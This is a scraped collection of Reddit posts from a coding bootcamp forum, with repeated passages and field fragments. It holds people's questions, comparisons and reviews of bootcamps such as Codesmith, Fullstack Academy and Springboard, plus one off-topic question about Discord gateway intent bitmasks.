my fiance’s work has possibility of uprooting at any given time which definitely factors into my interest for the possibility of having a career that can be done remotely or is easily transferable. i also just don’t want to work a job that feels meaningless to me, i want to do something that i enjoy and feel i can grow in while i wait for school (i am graduating at 21 if matters)

i have no idea where I would even start when looking at coding bootcamps as so many would cost more than what I owe for undergrad and it just doesn’t seem worth it if i will only do it for a few years (at least for now). are cheaper programs worth it? do you have any recommendations for that? do you believe it is a waste of time to pursue for anything besides hobby work for me? also has anybody here been in similar situation and could describe their roadplan/could link a post into what their process was like?

i have no idea where I would even start when looking at coding bootcamps as so many would cost more than what I owe for undergrad and it just doesn’t seem worth it if i will only do it for a few years (at least for now). are cheaper programs worth it? do you have any recommendations for that? do you believe it is a waste of time to pursue for anything besides hobby work for me? also has anybody here been in similar situation and could describe their roadplan/could link a post into what their process was like?

sorry for asking so many questions, i feel like a massive burden in asking but just feel so clueless in this situation and appreciate any advice i can get.Are boot camps worth it (at least in my circumstance)?",hey ppl quick u mind sub wiki ask post form graduating august bachelor stem field interest law school year two depending combination financial situation accepted school took comp sci high school although essentially ap codecademy enjoyed recently started simple introductory lesson free time fiance work possibility uprooting given time definitely factor interest possibility career done remotely easily transferable work job feel meaningless something enjoy feel grow wait school graduating 21 matter idea even start coding many cost owe undergrad seem worth year least cheaper program worth recommendation believe waste time pursue anything besides hobby work anybody similar situation could describe roadplancould link post process sorry asking many feel massive burden asking feel clueless situation appreciate advice getare worth least circumstance
codingbootcamp,"A bit of background first: I am prepared to quit my job and have a career change to the tech world. I am located in CST, so can't really take any of those on-site bootcamps in east of west coast.

I already got into HR's 19-week full stack bootcamp, but still like to explore some other options. For some reason (either from some post or mentioned by a friend, don't quite remember), AA got my attention. They have a 24-week full stack bootcamp, but with a higher price tag.

 A few questions:

1. I don't have programming experience so a beginner-friendlier program fits me better. Both bootcamps claim to require zero programming experience but how true is that?
2. Is it true that AA has a simpler curriculum than HR? And how does that affect job hunting?

codingbootcamp,"Hello guys, I'm 21 years old, no college degree at all, and I'm stuck on choosing the road ahead. I've recently got into coding, and I've been enjoying it
quite a bit. I'm having a bit of dilemma right now. I want to take a bootcamp, and get out making a good salary. Bootcamp is called codesmith and they report to the CIRR, the only problem is it that it seems that the majority of people that are in bootcamps are career switches, and already have a degree in some sort, so the degree atleast helps them in some sort after when trying to land a job. I have no degree at all and from researching, it will be even harder for me to get a job, if I chose to go the bootcamp route. I know that there is plenty of people in the swe roles that have went the self taught route and have pretty good jobs right now. I don't really know what to do at this point, I'm hesitant to go to college since I'll be giving that 4years and be behind my peers, and a 4 year wait till a job, or take the bootcamp route and possibly not being able to find a job.

I recently decided to switch career paths. I was attending college for ""video game art and design"" (basically a digital art degree).

I would love to end up in web design, or software development as the small amount of coding I have learned through Odin Project has really scratched the creative itch without needing to use fine motor skills to draw. 

My question is what should my next step be? I'm going to be completely honest and say that my last two semesters at my community college have been awful grade wise due to said illness and I'm on academic probation. Do I attend a bootcamp?

&gt;I wanted to make this post as kind of a counterweight to all the stories that get posted here of people attending bootcamps and then quickly making six figure salaries, because I do not think those stories really give an accurate impression to the people here who are considering going to a bootcamp. 

&gt;There's a concept in statistics called [survivorship bias](https://en.wikipedia.org/wiki/Survivorship_bias) where cases of failure are ignored because they're less visible than cases of success. The people who went to a bootcamp and didn't make it aren't going to come in here and talk about it, and they certainly aren't going to show up in the ""placement statistics"" that the bootcamps advertise. 

&gt;My cohort of 22 graduated a year ago from a fairly well-known bootcamp. Our program was pretty standard, three months of full-stack work focused on JavaScript and React which cost ~$15k. 

&gt;Out of those 22, 6 (including myself) are in full-time SWE roles, mostly small companies or agencies. No FAANG. 5 more are in other non-developer industry roles (recruiters, designers, support engineers etc). The other 11 are not working in the industry and most of them haven't even touched their LinkedIn profile for months. 

&gt;This amounts to a placement rate of 27% which is not great for a program that costs $15k. The official ""placement rate"" of my program according to their advertising materials is ~60% (which they reframe as ~90% by excluding people who don't participate in their career services ""to completion"" whatever that means).

&gt;I don't mean to scare people off bootcamps- they worked for me (although I already had a BA). But I do want to warn people who are thinking about a bootcamp as a *shortcut* to get into the industry without the effort or cost of a BSCS. Is it possible? Yes. Is it easy or guaranteed?

codingbootcamp,"Hi! So I have a couple of questions here. I am really interested in joining a coding bootcamp. My first question is: do I need to know what I want to do in the computer science field (EX: security analyst, software developer, front end developer, etc.) before I join a bootcamp? In other words, does a coding bootcamp prepare you for all computer science job roles or do you need to attend a bootcamp for the specific job role you want?

My other question is what is the best bootcamp to join? It’s been hurting my head looking it up. There are hundreds and thousands of boot camps out there. Preferably I want to join a bootcamp where you don’t pay tuition until you get a full-time job. What would be the best bootcamp with deferred tuition? At the same time, if there’s a better bootcamp with no deferred tuition I’ll look into joining that one too.

Please help. I am so desperate and new to this field. Also if it helps I would ideally like to complete the bootcamp in as little time as possible but willing to go up to 4-6 months

codingbootcamp,"hey guys im in a super weird predicament at the moment. Im in need of some advice, and guidance. A little background on myself. Im freshman studying a CS at a well known state school in Texas, my grades are far from perfect 2.1 GPA (barley avoiding academic probation). Anyways last night at around 2am I got caught up with the police when I was exiting my dorms parking garage. I didn't have my lights on when I pulled out, because there's lights in the garage. This caused the officer to pull me over. When I rolled my window down she immediately smelled weed resulting in a search on my car. What she found was 5g of weed and some rolling papers. As you may know Texas is SUPER strict when it comes to weed, as well as my college. The officer was super understating and let me slide on the possession charge, but she did give me a ticket for drug paraphernalia. 

&amp;#x200B;

At this point in the story you might find yourself asking why are you posting this in this sub? That's because at the university I attend if you have one run in with  UPD on campus that  involves drugs you're automatically expelled. This just happened last night so I haven't met with my dean but I already know my fate, its literally in the code conduct **I** signed. **Where your guys help comes into play?** I need advice on whether I should forgo my CS studies at another university or CC and just enter a bootcamp. Im not so fond of the whole college experience my time has been really shitty here. To the classes, the people, and the environment.

&amp;#x200B;

Im a very future focused kid, Im very skeptical on forging this degree because society makes it seem like if you don't have one you're a failure. But in reality I just want to be the absolute best programmer I can be. this whole incident has me hell bent on not using weed anymore. Is my life/career over because of this one incident? I've aspired to be a software engineer now for the past 6 or so years but not that im about to be kicked out of school I don't know if I can reach that goal.

&amp;#x200B;

TLDR: the dilemma, kicked out of school for getting caught with weed in my car. Whats my next move, go to another university and struggle with my mental health, and courses. Or attend a bootcamp for 12 or 24 weeks",kicked out of college,"hey guys im in a super weird predicament at the moment. Im in need of some advice, and guidance. A little background on myself.

Theres a list of all the intents on their docs [https://discord.com/developers/docs/topics/gateway#gateway-intents](https://discord.com/developers/docs/topics/gateway#gateway-intents) its a list of the names of the intents and something like this (1&lt;&lt;1), I didnt know what it was untill i searched and it was bitwise operators which i didnt know was a thing as i am self-taught in javascript and typescript and never came across it until now.

So, what i wanna do is pass in an array of strings of the gateway intents and convert it into a number and i really dont understand how.

If you still dont understand me, i want to make smth like this [https://ziad87.net/intents/](https://ziad87.net/intents/) [https://discord-intents-calculator.vercel.app](https://discord-intents-calculator.vercel.app/) just the calculation part

codingbootcamp,"So I’m kind of in a situation where I can pick and choose whether I want to target a full time or part time boot camp. I’m coming from a non technical background, and hearing all sorts of 80-100 hour week and long hours for the full time camps is quite intimidating. 

Would it be better to take the camps a bit slower and do part time so I have more time to absorb the information thrown at me as I go? I’m not in any particular rush financially at the moment, and am okay with focusing solely on learning, but I know that personally, I do tend to burn out easily if too much information is thrown at me at once.

codingbootcamp,"I realize the question of ""What's the best coding bootcamp?"" gets asked a lot, but hopefully my request is a bit more specialized!

I'm looking for the best bootcamp that dives a bit deeper into concepts over programming language mastery, if that's a thing.

I want one that will teach me about: System Architecture and design decisions/tradeoffs, patterns beyond just MVC, API creation (not just consumption), tradeoffs of database types (when to choose NoSQL), maybe even into heavier things like load balancing and caching (at least on a high level).

Obviously looking for full stack, bonus if it includes Mobile.

A strong preference for in-person (virtual) classes, not just a bunch of videos with some office hours run by uninterested former grads.

Does anyone have suggestions? HackReactor seems a bit too high level and fast, TechAcademy seems to lack instructor involvement, NuCamp actually seems decent but something about them feels amateurish?, University of Washinton's bootcamp seems structured amazingly but sadly is only Frontend.

codingbootcamp,"Alright, so after I got your attention after that headline, let me explain: I wouldn't say im a stupid person, but because I believe education doesn't determine a person's wisdom. I have a friend who's the same like me, doesn't have a graduation certificate and all that, basically we're the type of people who you will most likely find in physical labor without any real chance for a good job. BUT, he went through a course, and actually works as a coder, developer (not sure i know the difference) at high-tech. And as you know, the terms at working at an environment like that is so much better and rewarding than working at physical labor in lets say like retail, not to mention the paycheck obviously.

I'm thinking of going in the same direction, because I currently have on idea what to do with my life. in my imagination, coding can be quite a headache, writing all day, staring at the screen, it can be really exhausting in my opinion. its not really dynamic.

codingbootcamp,"Hey all,   
I was recently accepted to Codesmith, I only started coding in January and have been studying 8-10 hours a day but strictly learning Javascript. I have about 2 months to prepare for the full-time program but want to be as prepared as humanly possible and really get a grasp on the big picture since I am currently only comfortable with JavaScript.  Below I will try to explain where I am at currently in my studies and would like your recommendations on what would be the best course out of these three to improve my skills the most. I have heard great things about all three but would like some input on these three courses. (Frontend Masters, The Odin Project, and Fullstack Open)

While I am aware that there are plenty of people who go into the program just with the knowledge that was necessary to pass the technical interview, I would like to spend these next two months learning as much as possible since I am 100% committed to creating a new career path for myself. With that being said...

I will try to give a list of the concepts I am NOT familiar with but know that I will need to learn at some point throughout the program so why not start now!? Given my limited time, I won't be able to deep dive into all of these topics but would like some input on what you more experienced engineers feel are the most important to have a grasp on. if you have any  other recommendations that I don't list, please feel free to mention them, I would like to learn more about the following:  
\- HTML and CSS  
\- Git / Github and   
\- Git / Bash commands / basic command line commands  
\- Javascript modules and import / export statements  
\-React / Node / Express  
\-MongoDB / noSQL

codingbootcamp,"I know this subreddit this probably flooded with these types of questions but I need some helpful advice/recommendations with choosing a boot camp. Apologies in advance for the number of questions or if I say something wrong.

For context, I did go through a few languages on Free Code Camp to see if I would enjoy doing this before committing and I wanted to see if I could become a self-taught developer that way. This route has been a challenge in terms of finding a job, so now I am looking at other alternatives. I have been watching a lot of Youtube lately and reading reviews online. I've been interested in App Academy and Devslopes as well as many others. However, there are so many boot camps and reviews and other things to consider that's it's getting to be overwhelming and I have a few questions.

Does the boot camp I choose impact how desirable I will be in the job market? Do employers have favorites/ preferences? If so what are they?  I'm assuming some boot camps have better connections to better  employers than others.

Is there more of a demand for a software developer or software engineer jobs currently? What's the expected demand for the future? Does it matter?

Is it better to be a full-stack and know all the languages or specialize in a few? 

With that being said I am looking for a boot camp I can work at part-time. I would like to start sometime this year. I am also from Michigan if that helps.  I was interested in being a full-stack developer but ultimately I don't care about what I'm learning, whether that be how to build a website, an app, or dealing with ios. My main goal is just to be desirable in the job market so I have many offers in the future. I am aware that I might have trouble finding a job and I should study something I enjoy but I just view it as a job and I want security. 

With all of this in mind can someone point me into the right directions they think would would be a good fit for me or at least something I should look into? Anything and everything is appreciated.

My only things is: Is this too good to be true ? 

I'm doing an entrance assignment now and I have to say - I'm enjoying it.... I thought I would hate it -- but I don't. I even have had one or two compliments. 

But - what about the jobs ? Am I going to graduate and look like a deer in the headlights like I did 12 years ago when I graduated and I was looked upon as an idiot and told I was I knew nothing ?

Do these employers train integrate you into these jobs properly ? Do we actually work as a team or are we all politics and bullshit in the end ?

codingbootcamp,"I am moving to Atlanta this summer because of my partner's work and need advice about a career transition into coding (most likely via coding boot camp).

Background: Currently, I teach at two different universities in Ohio. I have a PhD in the humanities (foreign language and literature), but the job market is *extremely limited* for tenure-track positions, and there's no geographic flexibility. For the last two semesters, I have been working 80-90 hours a week. I am tired of the low pay, job insecurity, and lack of healthcare. I am also tired of the elitism in academia. I want to pivot into tech. I have several friends who have been highly successful after participating in Tech Elevator's coding boot camp. I took Tech Elevator's aptitude test last week and aced it. Afterwards I completed some small introductory lessons in Java that went well. Other than that, I do not have any coding background, but I am confident I have the skills and work ethic to succeed in coding. I really appreciate the hard skills-focused market (as opposed to Ivy-League-worship) and job availability in the field, and I love the problem-based, solution-oriented manner of work.

My question: what is the best way to pursue coding if I am planning to move to Atlanta this upcoming May/June 2022? I am fairly convinced at this point that a boot camp is the best way to go, but I am not sure about *which* boot camp. Tech Elevator is highly successful in its job placement and well-known in Ohio, but it does not have a hub in Atlanta. It does, however, have a national live remote version that I could participate in. Many of my friends have nothing but praise for Tech Elevator, and its reviews are stellar. That said, there are obviously coding boot camps that are actually based in Atlanta (like DigitalCrafts), but I don't personally know anyone who has been through them, and I don't know anyone who is in tech in Atlanta who could say whether the boot camps there are good. I would assume that at least some of them have built reputations with local companies and might more easily be able to help me get hired; these would be connections that I am assuming Tech Elevator does not have.

codingbootcamp,"When I was about to join a coding BootCamp I went to this sub to ask for help. Just wanted to give my insight for those of you who are choosing, in a BootCamp, or post-graduation. TLDR at the bottom. 

&amp;#x200B;

**Background**

\- I'm based in NYC and mainly looked for jobs within NY.

\- I previously worked as an account manager in an IT company (but have many classmates who had good job outcomes coming from videography, sales, marketing, etc)

\- I had minimal coding experience before BootCamp (HTML, CSS). I also did a Udemy course on JavaScript before going through the application process to make sure that this was something I'd enjoy. 

&amp;#x200B;

**Choosing a Bootcamp**

\- I shortlisted 3 bootcamps I thought were a fit for me: General Assembly, Fullstack Academy, and Lambda School.

\- I researched job outcomes and reached out to previous graduates to ask about their experience which ultimately led me to Fullstack Academy.

&amp;#x200B;

**During Bootcamp**

\- The course was intense and very fast-paced. It's important to practice coding the concepts you learn to truly understand them. I found it more effective than reading up and videos, though a mix of all is ideal. 

\- If you are involved in group projects, it's important to have significant input in the code and features, but also to understand the code that your other groupmates make. This will help you when speaking to an employer about your project. 

&amp;#x200B;

**Job Search**

**-** Understanding Algorithms and Data Structures is essential. The majority of technical interviews will involve you solving an algorithm, so make sure you practice them using [Leetcode](https://leetcode.com/), [Algoexpert](https://www.algoexpert.io/product), or whatever your preferred platform is. 

\- I would say Algoexpert is more beginner-friendly, since solutions and video explanations are available, but if you don't want to pay Leetcode is a good option. 

\- I personally used NeetCode's [spreadsheet](https://docs.google.com/spreadsheets/d/1A2PaQKcdwO_lwxz9bAnxXnIQayCouZP6d-ENrBz_NXc/edit#gid=0) of the 75 Essential Leetcode questions, which covers most problems and patterns you will find in technical job interviews. It includes links to all the Leetcode 75 questions, video solutions, and a section for notes. I cleared all existing notes and wrote my own once I completed a question. I found that it solidified the concept in my mind but do what works for you.

\- Apply to all and any job that isn't a ""Senior"" level job, even if it says that it requires x amount of years experience in the industry, or you don't know one of the coding languages/technologies listed. A lot of the companies will use this type of job description to let candidates *filter themselves out* thinking they aren't qualified. 

\- Don't be discouraged by rejection, even when you've made it through the interview stage. I applied to about 150 open roles and got 8 interviews. Of those 8 interviews, I only got 2 offers. At the end of the day, it only takes **ONE OFFER**. So don't be discouraged and just keep on grinding. 

&amp;#x200B;

**Outcome and Insight**

\- I received 2 offers, 1 with a large consulting company and 1 with a small startup. Both offers were in the 6 figure range (this will depend a lot on where you are based)

\- It took me 4 - 5 months to get these offers which sounds like a long time but is relatively short in the grand scheme of things. 

\- If your bootcamp offers fellowship or teaching assistant roles, I've found from previous graduates that it will boost your responses and opportunities and *could be* equivalent to an internship or experience in the industry. 

&amp;#x200B;

**TLDR**

I attended Fullstack Academy because of the job outcomes of previous graduates that I found on LinkedIn. The BootCamp was intense and fast-paced so continue to practice coding as often as you can. After graduating, study algorithms and data structures (I gave a few resources in the job search section) and apply to all and any jobs that aren't senior level. Don't be discouraged by rejection and just continue grinding, it only takes one. Good luck!

\- I previously worked as an account manager in an IT company (but have many classmates who had good job outcomes coming from videography, sales, marketing, etc)

\- I had minimal coding experience before BootCamp (HTML, CSS). I also did a Udemy course on JavaScript before going through the application process to make sure that this was something I'd enjoy. 

&amp;#x200B;

**Choosing a Bootcamp**

\- I shortlisted 3 bootcamps I thought were a fit for me: General Assembly, Fullstack Academy, and Lambda School.

\- I researched job outcomes and reached out to previous graduates to ask about their experience which ultimately led me to Fullstack Academy.

&amp;#x200B;

**During Bootcamp**

\- The course was intense and very fast-paced. It's important to practice coding the concepts you learn to truly understand them. I found it more effective than reading up and videos, though a mix of all is ideal. 

\- If you are involved in group projects, it's important to have significant input in the code and features, but also to understand the code that your other groupmates make. This will help you when speaking to an employer about your project. 

&amp;#x200B;

**Job Search**

**-** Understanding Algorithms and Data Structures is essential. The majority of technical interviews will involve you solving an algorithm, so make sure you practice them using [Leetcode](https://leetcode.com/), [Algoexpert](https://www.algoexpert.io/product), or whatever your preferred platform is. 

\- I would say Algoexpert is more beginner-friendly, since solutions and video explanations are available, but if you don't want to pay Leetcode is a good option. 

\- I personally used NeetCode's [spreadsheet](https://docs.google.com/spreadsheets/d/1A2PaQKcdwO_lwxz9bAnxXnIQayCouZP6d-ENrBz_NXc/edit#gid=0) of the 75 Essential Leetcode questions, which covers most problems and patterns you will find in technical job interviews. It includes links to all the Leetcode 75 questions, video solutions, and a section for notes. I cleared all existing notes and wrote my own once I completed a question. I found that it solidified the concept in my mind but do what works for you.

\- Apply to all and any job that isn't a ""Senior"" level job, even if it says that it requires x amount of years experience in the industry, or you don't know one of the coding languages/technologies listed. A lot of the companies will use this type of job description to let candidates *filter themselves out* thinking they aren't qualified. 

\- Don't be discouraged by rejection, even when you've made it through the interview stage. I applied to about 150 open roles and got 8 interviews. Of those 8 interviews, I only got 2 offers. At the end of the day, it only takes **ONE OFFER**. So don't be discouraged and just keep on grinding. 

&amp;#x200B;

**Outcome and Insight**

\- I received 2 offers, 1 with a large consulting company and 1 with a small startup. Both offers were in the 6 figure range (this will depend a lot on where you are based)

\- It took me 4 - 5 months to get these offers which sounds like a long time but is relatively short in the grand scheme of things. 

\- If your bootcamp offers fellowship or teaching assistant roles, I've found from previous graduates that it will boost your responses and opportunities and *could be* equivalent to an internship or experience in the industry. 

&amp;#x200B;

**TLDR**

I attended Fullstack Academy because of the job outcomes of previous graduates that I found on LinkedIn. The BootCamp was intense and fast-paced so continue to practice coding as often as you can. After graduating, study algorithms and data structures (I gave a few resources in the job search section) and apply to all and any jobs that aren't senior level. Don't be discouraged by rejection and just continue grinding, it only takes one. Good luck!

codingbootcamp,"As we all know, building a portfolio is instrumental in getting a job. It helps show employers that you know how to build production ready, full stack apps.

If you've got a strong portfolio and want to try something new, check out contributing to open source. In my experience it is an underrated career tool. Open Source contributions are an uncommon, yet strong signal of a high quality candidate. There are plenty of benefits:

\- learn core software job skills (how to use git, PR etiquette)

\- practice writing performant code (Most maintainers won't merge slow code)

\- build your soft skills by learning how to navigate disagreements

\- improve the libraries and tools you currently use

\- network with and learn from other developers; find a mentor

Contributing to OSS implies that you're a self-driven, ambitious person who isn't afraid to get in the weeds, collaborate with others, and make sure a solution is merged. This is essentially at the core of what employers look for in candidates.

I'm not saying run off and merge a major update into React; You can start much smaller than that. I started by writing small documentation fixes ([1](https://github.com/bitpay/wallet/pull/6456/files), [2](https://github.com/bitcoinbook/bitcoinbook/pull/347), [3](https://github.com/realpython/python-guide/pull/817)), and eventually added new functionality to libraries that I've used in some side projects ([1](https://github.com/picklepete/pyicloud/pull/159)).

If you don't know where to start, you can take a look at [GoodFirstIssue](https://goodfirstissue.dev/). They keep track of open source projects on github with issues that a beginner could contribute a fix for.

Hope this helps! 🤓

codingbootcamp,"Hi all, much like many of you I am in the decision process right now, I am about 1-5 weeks from each camp's start date. I'm looking for insight into Bootcamp choices. I am looking to start ASAP as I have some flexibility to take 3-4 months off work and have no prior obligations during that time (weddings, holidays, landlord obligations, etc).   


My background: I'm 30 and changing careers, I was in program management (mental health) for 5+ years prior. I also have a ton of bartending experience as I usually do that on the weekends for extra money and to meet people. I've been a carpenter for a bit as well working in residential remodels while I was in college.  I do have a BA. I am new to coding, but have about 90 hours of experience so far in the last 3 weeks, and am enjoying myself.   


Light House Labs: I am fully accepted into LHL, but I'm put off by them being Canadian-based as they won't have the job connections an American boot camp would, and even more so after reading a fair bit of horrible reviews in regard to material and career services. I've also watched a lot of their student's final presentations and wasn't really impressed as they were fairly simple and uncreative. The positives for my situation are they are cheaper, at 10k USD, and they start sooner, and I've completed 70 hours of their prep course along with passing a technical assessment. I will admit, something doesn't feel great though about the process as it was very easy, and the only emails I've received from admin are ones that ask me to pay early. I know they are legit, I'm just not sure they are the best for me due to lesser curriculum and networking.   


Next up is Sabio. I spoke with them and they sound great, they offer a fair and straightforward ISA,( $19500 max payment), base tuition is 15k with multiple offered scholarships, and you can take a sally mae loan out to cover the expenses. I am not seeing any graduates on LinkedIn though, which is a little worrying, but the folks I have spoken to speak highly of it. I think I would be a good fit there, and their outcomes seem acceptable for the US (median pay 71k, avg job placement is 82% and they exclude silicon valley jobs as not to skew the data). They seem honest and straightforward, which I enjoy in communications with them. If anyone has any experience with them, please reach out.   


Codeworks: 20k total cost, a ton of prep work which I do not mind at all, but the biggest thing is funding and the 20k vs 15k vs 10k. I see their results though and they are quite impressive, as is their alumni network. I'm guessing after speaking with the recruiter that their tech assessment is fairly tough, but I think they also have the highest quality curriculum of the 3 schools. Their hiring median is 110-120k out of the gate, which is very impressive. I would also love to speak to any alumnus out of there.   


TLDR; Interested in coding, applied to 3 boot camps. What would/did you choose and why?",Seeking graduate input on: Codesmith vs Sabio vs Lighthouse Labs,"Hi all, much like many of you I am in the decision process right now, I am about 1-5 weeks from each camp's start date. I'm looking for insight into Bootcamp choices. I am looking to start ASAP as I have some flexibility to take 3-4 months off work and have no prior obligations during that time (weddings, holidays, landlord obligations, etc).   


My background: I'm 30 and changing careers, I was in program management (mental health) for 5+ years prior. I also have a ton of bartending experience as I usually do that on the weekends for extra money and to meet people. I've been a carpenter for a bit as well working in residential remodels while I was in college.  I do have a BA. I am new to coding, but have about 90 hours of experience so far in the last 3 weeks, and am enjoying myself.   


Light House Labs: I am fully accepted into LHL, but I'm put off by them being Canadian-based as they won't have the job connections an American boot camp would, and even more so after reading a fair bit of horrible reviews in regard to material and career services. I've also watched a lot of their student's final presentations and wasn't really impressed as they were fairly simple and uncreative. The positives for my situation are they are cheaper, at 10k USD, and they start sooner, and I've completed 70 hours of their prep course along with passing a technical assessment. I will admit, something doesn't feel great though about the process as it was very easy, and the only emails I've received from admin are ones that ask me to pay early. I know they are legit, I'm just not sure they are the best for me due to lesser curriculum and networking.

I want to be as prepared as possible so i can actually absorb all the content and not play catch up with beginner material.

codingbootcamp,"So I have been searching for as many bootcamps as possible. I am currently self-teaching but I'm not ruling out the option to enroll in a coding bootcamp. 

I accidentally stumbled on [Codex Academy](https://www.codex.academy/#/) and it looks extremely new. The only reviews that I could find on it were on [Coursereport](https://www.coursereport.com/schools/codex-academy) and there were only 8 - all positive.


It looks like the program is self paced. They offer mentorship and an optional internship once you have completed the program. The price seems relatively reasonable for a bootcamp as well. I'm a little confused on the pricing of the programs as there are 3 of them but they are building blocks of each other/seem cumulative. So I'm wondering, if you purchase the last program (full stack software engineer - $13500) then would you get the course material for the previous 2 programs as well. 

Another interesting thing I found was the ISA agreement. It states that they will only take 10% of your income for an agreed upon period of time. I could be very wrong but that actually seems feasible and reasonable when comparing it to Lambda School/Bloomtech.

This looks like it could be very promising or just another bootcamp waiting to sit back and take people's money. What are your thoughts?

As a side note, I am waiting to speak to a rep to ask some questions about the program.

codingbootcamp,"I'm a woman looking to switch to coding simply because I despise my current career, in addition to the relatively low earning potential. No degree. I'm looking for a great boot camp with an environment that is at least positive for women. I have been exposed to coding before, but for all intents and purposes I am pretty much a beginner.

I got one recommendation for Ada Developers Academy, but they require that you either have experience or go through their prep course (which is apparently only offered to POC right now - technically, I am part Native American, but it's distant enough that I feel weird claiming POC to get into the program).

Someone else recommended Epicodus, but they also said half of the people dropped out before the course was over. I have negative opinions of courses where that many people drop out. Their vetting process is clearly not successful if half of the people who are allowed to join have to quit. Or they are not helping their students adequately. I want to know that if I put the time/effort in, and am not a dumbass, I will succeed.

My criteria, in short:

* Positive environment for women
* Acceptable for beginners (or at least willing to play a role in getting you up to speed)
* Willing to make sure most applicants who give a shit can pass (and learn)
* Teach useful things
* High likelihood of someone in my demographic (female, no degree, no professional coding experience) who graduates being capable of finding a job.

codingbootcamp,"I just want to know if anyone went through TekSystems to get into tech? 


Here’s the story: 

TLDR

I seen a post on LinkedIn advising that no experience was needed for this bootcamp through TekSystems. The bootcamp is 14 weeks long and training will be remote. Once you graduate bootcamp, you’ll be contracted through a Fortune 500 company for about 6 months then you’ll be hired on as a FTE with said company. The catch is: You must complete the bootcamp and pass with a 82% or be subject to pay back the full amount. You may need need to relocate to one of their locations in Phoenix, Boston, Minneapolis in the event employees are to  return to office and you must work with the company for 1 year. 

So, I’m like let’s do it! I really want to become a SWE. Now mind you I don’t have any code experience. I reach out to the recruiter, and I’m thinking from jump he comes off a little unprofessional but whatever. He sends me an assessment to take, and when I take the assessment for some reason it keeps timing out so in the email that was sent it says if any technical issues occur it says to close out and click the link again to finish where you left off. It would literally happened every couple minutes and when I would log back in, the timer never stopped, I would only have a few seconds left to answer or it will completely skip to the next question and the issue would happen every question. It was the most frustrating thing ever. 

So, I take screenshots and emailed it over to the recruiter. I failed the assessment which I knew because I couldn’t answer the questions. A few hours go by, I don’t receive response, so I message them on LinkedIn and I was told he’s working with  his manager about it. Another few days go by and still no response. I finally call and he didn’t even remember me, and was very unprofessional in his response when I asked for an update on the retake. He tells me my score was too low and I am not able to move forward in the process as if I never mentioned the technical errors so maybe he didn’t even get with his manager about the situation. Says he pretty much is busy and hangs up. 

I sent him another message and asked if I could speak with a manager because I feel like I wasn’t able to complete the assessment the right way. I’m sure I would have got a passing score. And, Of course no response.",TekSystems BootCamp,"I just want to know if anyone went through TekSystems to get into tech?

codingbootcamp,"**TLDR: Don't waste your time and money. Get a degree if you have the means to do so.**

I enrolled in Springboards Software Engineering Career Track in Feb 2021. I had some experience with HTML/CSS but have never done anything with a real programming language. 

First I will say that Springboard has a great student support team. They were always responsive and very helpful. The career coaches were helpful with getting my LinkedIn/resume up to par as well. However, my experience with the curriculum, mentors, and TA's was awful and absolutely not worth the cost. 

My biggest problem with this program was how the projects were laid out. They have you watch 10-20 videos, code-along, take notes, then complete a project with 50 different concepts you just learned. No quizzes, no multiple-choice tests, no questions to solidify the knowledge you just learned, just one big project that you're expected to know all the answers to. This is incredibly lazy and not at all the right way to solidify a foundation. The projects instructions were often unclear with tons of grammar mistakes. The solutions had many problems and would use syntax that was never taught to you. It's like Colt made the videos but outsourced the projects to someone else. There wasn't a single project that I could complete without having to look at the solution or ask for help, even in the prep course where they are supposed to be teaching you the absolute basics to someone who has never written a line of code before. If you are a Windows user be prepared to struggle even more, they have workaround videos but many students in the Slack have had trouble with the command line and pushing to Heroku.

In the first unit right after learning JavaScript basics, they expect you to build a full stack web application in a multi page 10000+ line codebase using only Vanilla JavaScript. Everyone in the slack channel has said this is an insane project for someone to complete after only being in the course for a few weeks. It's like the Springboard team knows it's bad, but they don't do anything about it because they got a thousand suckers signing up for the course every month with no refunds.

Colt goes super fast during his code-alongs and never explains the theory or ""why"" he's doing what he's doing. So there's a lot of pausing the video, and every time you pause there's a stupid overlay covering all the code you're trying to look at, which is infuriating. Also I'm hard of hearing and the subtitles were only there for about half of the videos. The most annoying thing for me is that he uses his fucking chickens in every single code example. It's obnoxious and it makes everything he's trying to teach you sound the same. The repetition makes it dry and you don't know the exact situations you should be using arrays, lists, dictionaries, promises, loops, functions, async/await, etc. He's trying to be funny but it had the opposite effect on me.

My experience with the mentors was absolutely awful. I knew learning how to code was going to be difficult, but the reason I paid so much money for this is so that I could accelerate and have someone get me unstuck along the way. My first mentor got fired for telling a student that it's really difficult to get a job with just a bootcamp (**spoiler alert: he's 100% right**), the second never showed up to the calls leaving me stuck for weeks, and the 3rd one didn't know Python, so he couldn't help me through my capstone project. The TA's absolutely refused to help me on my Capstone so there was literally no way out. Being stuck on this stuff by myself, in an online course, where the teacher doesn't know anything and and no classmates to ask was incredibly isolating and overall a horrible experience for me. 

I spent a year trying to complete this program that should have only taken 9 months, and I was only able to complete 50%. I struggled for an entire year. I really was putting in the hours too- I just had so many issues with getting stuck with no one to ask so I dropped out. After explaining my situation to the support team, they made an exception and I got a 50% refund. I wish I didn't waste my money though, they still got $4k from me. Just know that this is a FOR-PROFIT SCHOOL designed to generate as much money as possible, they don't actually care about your success or your career in the long term.

Even if I were to complete it after struggling so much, I'm not confident that I would have gotten a good job. They have a job guarantee, but you need to be willing to relocate, take any position offered (including internships), apply to 50+ jobs/week, and you must pass the mock interviews otherwise you will be ineligible. Read the fine print.

If you have a solid programming background and you get a really good mentor that's willing to help you more than the allotted 30 minutes a week, then this program might be alright. However if I could go back, I'd go back to college and spend that year working on a CS degree.

codingbootcamp,"Hi everyone, I've been in college for a couple years at this point and everything is kind of just all falling apart. My mental health has taken a rapid dive and it has been hard to even look at due dates or assignments without feeling extremely disappointed and suicidal. My grades have been tanking for a while and it's just a bit too much to come back from at this point in the semester. I'm really worried about having opportunities in the field after this and was hoping to get advice or reassurance from anyone that may have some helpful insight.

&amp;#x200B;

Here's some key points I wanted to just make clear

&amp;#x200B;

1) I'm far enough behind in my classes that reaching out to my professors would be to no avail (could just be insecurity and depression talking here)

&amp;#x200B;

2) I still have around 2 years in my degree and making it past this semester seems like my total limit

&amp;#x200B;

3) Due to my grades I have stopped being able to receive financial aid.

&amp;#x200B;

4) I'm paying out of pocket and with the last of the loans I was able to get for my school

&amp;#x200B;

5) I have made really big strides through a lot of open source github repos for ""coding university"" and I feel really self motivated and that I fully grasp the concepts when I can use my own analysis.

&amp;#x200B;

6)Theres a local apprenticeship that takes in individuals that are interested in tech and has a 9 week ""bootcamp"" and then they give you a reference to apply to one of the companies that works with them. Website is here, from what I hear they are a legit company.

codingbootcamp,"Hello everyone,
